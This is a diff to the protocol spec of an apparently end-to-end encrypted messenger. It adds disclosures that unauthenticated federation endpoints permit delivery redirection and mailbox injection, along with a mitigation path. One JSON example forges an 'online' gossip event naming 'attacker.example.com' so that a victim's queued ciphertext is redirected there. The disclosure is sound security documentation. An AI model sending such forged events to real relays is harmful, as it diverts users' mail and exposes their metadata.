@@ -276,7 +276,7 @@ All request and response bodies use `application/json`.
 
 ### Federation Transport
 
-Servers contact peers over `https://<peer-host>`. Federation traffic carries no bearer tokens — federation endpoints are open to any caller, with abuse-related defenses (SSRF egress filtering, presence-gated forwarding, per-peer linear backoff) handled internally. See §7.
+Servers contact peers over `https://<peer-host>`. Federation traffic carries no bearer tokens — federation endpoints are open to any caller, with abuse-related defenses (SSRF egress filtering, presence-gated forwarding, per-peer linear backoff) handled internally. Those defenses bound abuse; they do **not** authenticate the peer, and an unauthenticated caller can both redirect a victim's queued mail (via `/federation/gossip`) and inject blobs into an online recipient's mailbox (via `/federation/forward`). Both are accepted limitations of v0.1 — see §7 for the endpoints and §10 for the security analysis.
 
 ### Message Size Limit
 
@@ -330,6 +330,8 @@ Authorization: Bearer <session_token>
 ```
 
 When the server trusts proxy headers (`trustForwardedFor`, on by default), sessions are bound to the client's source IP — the last `X-Forwarded-For` hop. A later request from a different IP is rejected as `unauthorized`. If proxy-header trust is disabled, or no `X-Forwarded-For` header is present, the session is not IP-bound and this check is skipped.
+
+> **IP binding and mobile clients.** IP binding means a session does not survive a change of source address. In the reference deployment (Caddy in front, `trustForwardedFor` on) a phone that moves between Wi-Fi and cellular — or is NAT-rebound by its carrier — comes back on a new IP, so its next `/poll` or `/messages` gets `401 unauthorized` even though the token has not expired. This is expected: a client MUST treat `401` on any authenticated request as "re-run challenge/verify", not as a fatal error, and retry the request with the fresh token. The cost is one extra round trip per network change; the benefit is that a stolen bearer token is not usable from another network. Operators who prefer sessions that roam can run with `--trustForwardedFor=False`, which leaves sessions un-bound (the check is skipped when no trusted IP is available).
 
 When a token expires, the server responds with `401`. The client re-authenticates by repeating the challenge-response flow.
 
@@ -474,6 +476,8 @@ A server may hold multiple presence rows for the same pubkey — one per peer th
 - Rejected with `400 invalid_request` if `fromServer` equals this server's identity, fails the SSRF deny-list, or the event count exceeds the cap.
 - `online` events for keys not previously seen at `fromServer` trigger an immediate forward sweep: any locally-queued messages addressed to those keys are scheduled for `/federation/forward`.
 
+> **Unauthenticated — and this endpoint steers delivery.** `/federation/gossip` accepts any caller, and the `fromServer` field is self-asserted. Because an `online` event causes the receiving server to forward that pubkey's queued mail to `fromServer`, anyone who can reach a relay can *redirect* a victim's inbound ciphertext to a host of their choosing by announcing `{ "eventType": "online", "pubkey": <victim>, "fromServer": <attacker-host> }`. See §10, *Open federation — gossip redirect*.
+
 ### `POST /federation/forward` — Receive a federated message
 
 **Request:**
@@ -487,6 +491,8 @@ A server may hold multiple presence rows for the same pubkey — one per peer th
 There is no `from`, no origin-server hint, and no sender timestamp — the receiving server simply records the blob for the recipient.
 
 The receiver **requires the recipient to be currently locally online** (i.e. have an unexpired local presence row). If not, it returns `404 no_presence` and the origin retries (see below) or holds the message in its own mailbox.
+
+> **Unauthenticated — mailbox injection is possible.** `/federation/forward` accepts any caller: there is no bearer token, no peer signature, and nothing ties the request to a server the receiver actually federates with. Any host that can reach a relay can therefore inject arbitrary blobs into the mailbox of any recipient who is currently locally online. The only bounds are the per-source-IP rate limit on the route (`forwardLimit`), the SSRF deny-list (which constrains where a relay will *send*, not who may call it), and the `no_presence` gate (which limits injection to online recipients). Injected junk is undecryptable, so a client drops it silently on ingest — but it still occupies the recipient's poll stream and the relay's mailbox until the cursor advances past it. This is an accepted limitation of v0.1; see §10, *Open federation — forward injection*. Peer authentication is the intended fix.
 
 ### Forward Retries
 
@@ -591,10 +597,27 @@ Skrepka protects message **content and sender identity** from servers and networ
 | **No durable delivery**           | If the sender's server goes down or all forward retries fail, messages may be lost. |
 | **Unauthenticated session relay** (mitigated) | The auth signature is bound to the target server's hostname under a domain-separation tag (§6), so a malicious/relay server can no longer forward another server's challenge and replay the resulting signature to impersonate the client elsewhere — the signature commits to the relay's own hostname. Residual caveat: the binding is to the hostname the client dialed, so it assumes the client reaches each server under its true `serverHost` (DNS/TLS integrity); it does not defend against an attacker who fully controls name resolution and the server's certificate. |
 | **Same-recipient replay**         | Nothing stops a captured blob from being re-delivered to its original recipient. The damage is bounded per payload type: `text` is deduplicated by `id`, `delivery.ack` is idempotent, and `profile` — which carries no `id` — is guarded by the per-contact `ts` staleness check of §4, which the reference client enforces, so a replayed stale `profile` is dropped rather than rolling a contact's cached profile back. A client that omits that check is open to profile rollback. |
-| **Open federation — gossip redirect** | Federation endpoints are unauthenticated. The SSRF deny-list and `no_presence` gate limit abuse but do not authenticate peers. Beyond passively observing gossip, a hostile server can *actively redirect delivery*: by announcing `{eventType:"online", pubkey:<victim>, fromServer:<attacker>}` it causes origin servers to forward the victim's queued ciphertext to the attacker, which harvests ciphertext copies plus recipient/timing/size metadata. |
-| **Open federation — forward injection** | `/federation/forward` is unauthenticated, so any host can inject arbitrary blobs into a currently-online recipient's mailbox (rate-limited per source IP, and undecryptable blobs are dropped client-side, but they still consume the recipient's poll stream). |
+| **Open federation — gossip redirect** | `/federation/gossip` is unauthenticated, and the harm is *active*, not merely passive observation: an attacker announces the victim online at a host it controls and origin relays forward the victim's queued ciphertext there. See *Open federation* below. |
+| **Open federation — forward injection** | `/federation/forward` is unauthenticated, so any host can inject arbitrary blobs into a currently-online recipient's mailbox. See *Open federation* below. |
 | **No cryptographic agility**      | The wire format has no version field and a fixed HKDF `info` (§3); the AEAD/KDF/curve cannot be migrated in-band. |
 | **TOFU only**                     | A first-time public key is trusted on encounter; users must compare fingerprints out-of-band to detect MITM at first contact. |
+
+### Open Federation (accepted limitation of v0.1)
+
+Every `/federation/*` endpoint accepts **any caller**. There is no bearer token, no peer signature, and no allow-list: a relay cannot tell a genuine peer from an arbitrary host on the internet. Two concrete attacks follow, and it is worth stating them precisely, because "a hostile server can observe gossip" understates both.
+
+**1. Gossip redirect — actively rerouting a victim's mail.** The `fromServer` field on `/federation/gossip` is self-asserted, and an `online` event for a previously-unseen key makes the receiving relay sweep its mailbox and forward that key's queued messages to `fromServer` (§7). So an attacker does not have to wait and watch. It posts:
+
+```json
+{ "events": [ { "eventType": "online", "pubkey": "<victim>" } ],
+  "fromServer": "attacker.example.com" }
+```
+
+to every relay it can reach. Each relay holding mail for the victim now forwards that ciphertext to the attacker's host. The receiver-side "recipient must be locally online" gate does not help — that check runs on the *attacker's* server, which the attacker controls. Message **content** stays protected by E2E encryption, but the attacker harvests ciphertext copies and recipient/timing/size metadata — a real leak for a metadata-privacy-focused messenger.
+
+**2. Forward injection — spam into an online recipient's mailbox.** `/federation/forward` is unauthenticated, so any host can inject arbitrary blobs into the mailbox of any recipient who is currently locally online. Injected junk is undecryptable, so a client drops it silently on ingest — but it occupies the recipient's poll stream and the relay's mailbox until the cursor advances past it. The only bounds are the per-source-IP rate limit (`forwardLimit`), the SSRF deny-list (which constrains where a relay will *send*, not who may call it), and the `no_presence` gate (which limits injection to online recipients).
+
+**Mitigation path.** Both attacks are accepted limitations of v0.1's unauthenticated federation. The intended fix is peer authentication — signed presence gossip and authenticated forward requests — or an explicit peer allow-list gate before `forwardQueuedToServer`. Until then, operators who federate only with trusted peers (or not at all) are unaffected.
 
 ### Recommendations for Implementers
 
